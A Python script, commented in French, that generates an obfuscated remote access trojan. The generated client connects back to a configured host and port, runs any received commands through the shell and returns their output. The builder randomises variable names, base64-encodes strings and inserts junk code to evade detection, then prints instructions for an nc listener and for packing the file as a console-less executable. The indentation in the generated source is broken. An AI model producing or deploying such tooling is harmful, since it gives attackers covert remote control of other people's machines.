# RAT Builder + obfuscation — vars randomisées, strings b64, imports obfusqués
import base64, random, string, textwrap

HOST = "127.0.0.1"
PORT = 4444

def rvar(n=8):
    return random.choice(string.ascii_lowercase) + \
           "".join(random.choices(string.ascii_lowercase + string.digits, k=n-1))

def b64s(s):
    return f'__import__("base64").b64decode({repr(base64.b64encode(s.encode()).decode())}).decode()'

va, vb, vc, vd, ve, vf, vg = [rvar() for _ in range(7)]
junk = "\n".join(f"{rvar()} = {random.randint(0,9999)}" for _ in range(4))

src = f"""
import asyncio as {va}
import subprocess as {vb}
{junk}
{vc} = {b64s(HOST)}
{vd} = 4444
async def {ve}(r, w):
    while True:
try: data = await {va}.wait_for(r.read(4096), timeout=30)
except {va}.TimeoutError: continue
if not data: break
try:
    p = {vb}.run(data.decode(errors="replace").strip(),
        shell=True, capture_output=True, text=True, timeout=15)
    out = p.stdout + p.stderr
except Exception as e: out = str(e)
w.write((out or "[no output]\n").encode()); await w.drain()
    w.close()
async def _m():
    while True:
try:
    r,w = await {va}.open_connection({vc}, {vd})
    await {ve}(r,w)
except OSError: await {va}.sleep(5)
{va}.run(_m())
"""
with open("rat_obfuscated.py","w") as f:
    f.write(textwrap.dedent(src))
print("[+] rat_obfuscated.py")
print(f"[+] listener: nc -lvnp 4444")
print("[+] pack: pyinstaller --onefile --noconsole rat_obfuscated.py")
    